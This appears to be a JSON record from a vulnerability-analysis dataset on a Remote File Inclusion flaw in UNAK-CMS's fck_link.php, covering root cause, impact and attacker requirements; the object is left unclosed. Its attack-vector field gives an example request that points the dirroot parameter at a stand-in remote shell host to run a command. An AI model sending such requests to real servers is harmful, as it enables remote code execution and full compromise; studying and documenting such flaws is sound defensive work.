{
  "Root cause of vulnerability": "The vulnerability lies in the `fck_link.php` file of the UNAK-CMS application. It directly incorporates a user-supplied value from the `dirroot` parameter into the include statement without sufficient sanitization.",
  "Weaknesses/vulnerabilities present": "Remote File Inclusion (RFI) vulnerability. The application allows an attacker to include a remote file by manipulating the `dirroot` parameter.",
  "Impact of exploitation": "An attacker can execute arbitrary code on the server by including a malicious remote file. This could lead to a full system compromise, data theft, or denial of service.",
  "Attack vectors": "The attacker sends a crafted HTTP request to `fck_link.php` with a malicious URL in the `dirroot` parameter. For example: `http://sitename.com/[Script Path]/fckeditor/editor/dialog/fck_link.php?dirroot=http://SHELLURL.COM?&cmd=id`.",
  "Required attacker capabilities/position": "The attacker needs to be able to send HTTP requests to the vulnerable server and host a malicious file on a remote server that can be accessed by the vulnerable application."
